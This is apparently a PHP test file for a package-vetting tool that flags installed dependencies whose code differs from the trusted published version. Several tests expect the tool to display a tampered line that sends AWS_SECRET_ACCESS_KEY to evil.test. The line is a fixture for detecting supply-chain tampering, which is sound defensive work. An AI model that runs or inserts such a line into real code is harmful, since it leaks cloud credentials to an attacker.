<?php

declare(strict_types=1);

use App\Support\Json;
use App\ValueObjects\Manifest;
use Illuminate\Support\Facades\Artisan;
use Tests\Fixtures\Fixture;

it('reads the delta of a tree whose bytes changed at the trusted version', function (): void {
    $fixture = Fixture::open('tampered-project');

    try {
        $status = vet(['--path' => $fixture->rootPath]);
        $output = Artisan::output();
    } finally {
        $fixture->remove();
    }

    expect($status)->toBe(1)
        ->and($output)
        ->toContain('acme/widget 1.0.0')
        ->toContain('1 file changed')
        ->toContain('same version, different code')
        ->toContain('~ src/Widget.php')
        ->toContain("+        file_get_contents('https://evil.test/?'.getenv('AWS_SECRET_ACCESS_KEY'));");
});

it('names the published bytes and the installed bytes that it compared', function (): void {
    $fixture = Fixture::open('tampered-project');

    try {
        $status = vet(['packages' => ['acme/widget'], '--path' => $fixture->rootPath]);
        $output = Artisan::output();
    } finally {
        $fixture->remove();
    }

    expect($status)->toBe(1)
        ->and($output)
        ->toContain('delta ([1.0.0] as published → [1.0.0] as installed)')
        ->toContain('compared against')
        ->toContain('your installed tree')
        ->toContain('9353593981e7 → 601b984f6d8a')
        ->toContain("+        file_get_contents('https://evil.test/?'.getenv('AWS_SECRET_ACCESS_KEY'));");
});

it('shows the delta before it records a tree whose bytes changed', function (): void {
    $fixture = Fixture::open('tampered-project');

    try {
        trust('acme/widget', ['--path' => $fixture->rootPath])
            ->expectsOutputToContain("+        file_get_contents('https://evil.test/?'.getenv('AWS_SECRET_ACCESS_KEY'));")
            ->expectsOutputToContain('Recorded [acme/widget] [1.0.0]')
            ->assertExitCode(0)
            ->run();

        $trustFile = $fixture->read('vet.json');
    } finally {
        $fixture->remove();
    }

    expect($trustFile)->toContain('tree-v2:601b984f6d8a76c7c2bcd40c238b93ae1123fd74eaaccc95a80c498d662c97a6');
});

it('trusts a tree whose changed bytes sit in a file that the trust file ignores', function (): void {
    $fixture = Fixture::open('tampered-project');

    ignoreWidgetSource($fixture, (string) Manifest::ofDirectoryIgnoring($fixture->path('vendor/acme/widget'), ['src/Widget.php'])->hash());

    try {
        $status = vet(['--path' => $fixture->rootPath]);
        $output = Artisan::output();
    } finally {
        $fixture->remove();
    }

    expect($status)->toBe(0)
        ->and($output)->toContain('All [2] packages are trusted.');
});

it('keeps the ignored files out of the delta and in the trust file that it writes', function (): void {
    $fixture = Fixture::open('tampered-project');

    ignoreWidgetSource($fixture, 'tree-v2:9353593981e757356e4365ed9b510a3a2483c2a4ec7cdb3dfd0b9c1f1e7a9e99');

    try {
        trust('acme/widget', ['--path' => $fixture->rootPath])
            ->doesntExpectOutputToContain('src/Widget.php')
            ->expectsOutputToContain('Recorded [acme/widget] [1.0.0]')
            ->assertExitCode(0)
            ->run();

        $ignored = Json::array(Json::readFile($fixture->path('vet.json'), 'the vet file'), 'ignore');
    } finally {
        $fixture->remove();
    }

    expect($ignored)->toBe(['acme/widget' => ['src/Widget.php']]);
});

function ignoreWidgetSource(Fixture $fixture, string $hash): void
{
    file_put_contents($fixture->path('vet.json'), Json::encode([
        'require' => [
            'acme/widget' => ['version' => '1.0.0', 'hash' => $hash],
        ],
        'require-dev' => [
            'acme/lint' => ['version' => '1.0.0', 'hash' => 'tree-v2:eac3f8cc56e42fa54d4b8dc674cf02c1fd9bf25bae2efb813289750d90e567af'],
        ],
        'ignore' => [
            'acme/widget' => ['src/Widget.php'],
        ],
    ]));
}

it('keeps the ignore list when --fresh records the baseline again', function (): void {
    $fixture = Fixture::open('tampered-project');

    ignoreWidgetSource($fixture, 'tree-v2:9353593981e757356e4365ed9b510a3a2483c2a4ec7cdb3dfd0b9c1f1e7a9e99');

    try {
        $status = vet(['--fresh' => true, '--path' => $fixture->rootPath]);
        $afterFresh = vet(['--path' => $fixture->rootPath]);
        $ignored = Json::array(Json::readFile($fixture->path('vet.json'), 'the vet file'), 'ignore');
    } finally {
        $fixture->remove();
    }

    expect($status)->toBe(0)
        ->and($afterFresh)->toBe(0)
        ->and($ignored)->toBe(['acme/widget' => ['src/Widget.php']]);
});
